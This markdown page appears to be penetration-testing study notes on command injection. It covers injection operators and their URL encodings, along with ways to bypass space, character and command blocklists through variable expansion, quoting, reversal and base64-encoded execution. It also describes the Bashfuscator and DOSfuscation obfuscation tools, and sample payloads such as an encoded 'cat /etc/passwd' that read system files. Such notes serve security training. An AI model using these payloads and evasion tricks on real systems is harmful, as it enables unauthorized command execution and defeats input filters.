---
layout: default
title: Command Injection
permalink: /Web/command_injection/
---

# Command Injection

A Command Injection vulnerability is among the most critical types of vulnerabilities. It allows us to execute system commands directly on the back-end hosting server. Whenever user input is used within a query without being properly sanitized, it may be possible to escape the boundaries of the user input string to the parent query and manipulate it to change its intended purpose.

## Command Injection methods

<table>
  <thead>
    <tr>
      <th>Injection Operator</th>
      <th>Injection Character</th>
      <th>URL-Encoded Character</th>
      <th>Executed Command</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Semicolon</td>
      <td>;</td>
      <td>%3b</td>
      <td>Both</td>
    </tr>
    <tr>
      <td>New Line</td>
      <td>\n</td>
      <td>%0a</td>
      <td>Both</td>
    </tr>
    <tr>
      <td>Background</td>
      <td>&amp;</td>
      <td>%26</td>
      <td>Both (second output generally shown first)</td>
    </tr>
    <tr>
      <td>Pipe</td>
      <td>|</td>
      <td>%7c</td>
      <td>Both (only second output is shown)</td>
    </tr>
    <tr>
      <td>AND</td>
      <td>&amp;&amp;</td>
      <td>%26%26</td>
      <td>Both (only if first succeeds)</td>
    </tr>
    <tr>
      <td>OR</td>
      <td>||</td>
      <td>%7c%7c</td>
      <td>Second (only if first fails)</td>
    </tr>
    <tr>
      <td>Sub-Shell</td>
      <td><code>``</code></td>
      <td>%60%60</td>
      <td>Both (Linux-only)</td>
    </tr>
    <tr>
      <td>Sub-Shell</td>
      <td><code>$()</code></td>
      <td>%24%28%29</td>
      <td>Both (Linux-only)</td>
    </tr>
  </tbody>
</table>

*Note: If we URL encode a new-line, we have to encode a literal newline character (Enter). We get a different result if we encode a literal backslash followed by "n"*
If user input validation is happening on the front-end, we can bypass it by sending custom HTTP requests directly to the back-end. E.g. using a proxy like Burp Suite or ZAP.

<table>
  <thead>
    <tr>
      <th>Injection Type</th>
      <th>Operators</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SQL Injection</td>
      <td><code>'</code>, <code>;</code>, <code>--</code>, <code>/* */</code></td>
    </tr>
    <tr>
      <td>Command Injection</td>
      <td><code>;</code>, <code>&amp;&amp;</code></td>
    </tr>
    <tr>
      <td>LDAP Injection</td>
      <td><code>*</code>, <code>()</code>, <code>&amp;</code>, <code>|</code></td>
    </tr>
    <tr>
      <td>XPath Injection</td>
      <td><code>'</code>, <code>or</code>, <code>and</code>, <code>not</code>, <code>substring</code>, <code>concat</code>, <code>count</code></td>
    </tr>
    <tr>
      <td>OS Command Injection</td>
      <td><code>;</code>, <code>&amp;</code>, <code>|</code></td>
    </tr>
    <tr>
      <td>Code Injection</td>
      <td><code>'</code>, <code>;</code>, <code>--</code>, <code>/* */</code>, <code>$()</code>, <code>${}</code>, <code>#{}</code>, <code>%{}</code>, <code>^</code></td>
    </tr>
    <tr>
      <td>Directory Traversal/File Path Traversal</td>
      <td><code>../</code>, <code>..\\</code>, <code>%00</code></td>
    </tr>
    <tr>
      <td>Object Injection</td>
      <td><code>;</code>, <code>&amp;</code>, <code>|</code></td>
    </tr>
    <tr>
      <td>XQuery Injection</td>
      <td><code>'</code>, <code>;</code>, <code>--</code>, <code>/* */</code></td>
    </tr>
    <tr>
      <td>Shellcode Injection</td>
      <td><code>\x</code>, <code>\u</code>, <code>%u</code>, <code>%n</code></td>
    </tr>
    <tr>
      <td>Header Injection</td>
      <td><code>\n</code>, <code>\r\n</code>, <code>\t</code>, <code>%0d</code>, <code>%0a</code>, <code>%09</code></td>
    </tr>
  </tbody>
</table>

## Bypass Blocklisted Operators

The new-line character is usually not blacklisted, as it may be needed in the payload itself.

### Bypass Space
- Using tabs (%09) instead of spaces is a technique that may work.
- Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space.
- We can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces, as follows: `{ls,-la}`.

### Bypass Specail Characters
#### Linux
- One technique we can use for replacing characters is through Linux Environment Variables. While ${IFS} is directly replaced with a space, other characters may be used in other environment variables, and we can specify start and length of our string to exactly match the desired character. E.g. `${PATH:0:1}` is probably a `/`, `${LS_COLORS:10:1}` is probably a `;`. Other candidates: `$HOME` or `$PWD`.

*Note: The `printenv` command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.*

- Character Shifting: The `$(tr '!-}' '"-~'<<<[)` Linux command shifts the character we passed by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[`.
- 
#### Windows
- The same concept works on Windows as well: `%HOMEPATH:~6,-11%`
- With PowerShell, a word is considered an array, so we have to specify the index of the character we need. E.g. `$env:HOMEPATH[0]`

*Note: We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need.*

### Bypass Blocklisted Commands
If we can obfuscate our commands and make them look different, we may be able to bypass the filters.
*Note: we can (and probably need to) combinde these techinques with the previous ones!*
We can also get inspiration from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).
#### Linux & Windows
- One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others. E.g. `w'h'o'am'i` or `w"h"o"am"i`
  *Note: we cannot mix types of quotes and the number of quotes must be even!*
- Case manipulation is another techinque we can use (e.g. WhOaMi). Linux systems are case-sensitive, so we have to get a bit creative and find a command that turns the command into an all-lowercase word. E.g. `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` or `$(a="WhOaMi";printf %s "${a,,}")`. If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in. E.g. `WhOaMi`.
- Reversed commands:  `$(rev<<<'imaohw')` in Linux or `iex "$('imaohw'[-1..-20] -join '')"` in Windows.
  *Note: If we wanted to bypass a character filter with this method, we'd have to reverse them as well, or include them when reversing the original command.
- Encoded Commands: We can utilize various encoding tools, like base64 (for b64 encoding) or xxd (for hex encoding). E.g. executing the `cat /etc/passwd | grep 33` command would be: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` in Linux (we are using `<<<` to avoid using a pipe `|`, which is a filtered character).
  In Windows:
  ```
  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
  ```
  to get the encoded string adn then:
  ```
  iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ENCODED_STRING')))"
  ```
  We may also achieve the same thing on Linux, but we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:
  ```
  echo -n whoami | iconv -f utf-8 -t utf-16le | base64
  ```
#### Linux
- We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command. These characters include the backslash `\` and the positional parameter character `$@`. This works exactly as it did with the quotes, but in this case, the number of characters do not have to be even. E.g. `who$@ami`, `w\ho\am\i`
#### Windows
- There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret `^` character. E.g. `who^ami`

## Evasion Tools
If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools.
### Linux (Bashfuscator)
A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:
```
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the -h help menu.
- We can start by simply providing the command we want to obfuscate with the -c flag:
  ```
  ./bashfuscator -c 'cat /etc/passwd'
  ```
  However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:
  ```
  ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
  ```
  We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:
  ```
  bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
  ```
### Windows (DOSfuscation)
There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation).
In Powershell:
```
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```
We can even use tutorial to see an example of how the tool works. Once we are set, we can start using the tool, as follows:
```
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
```


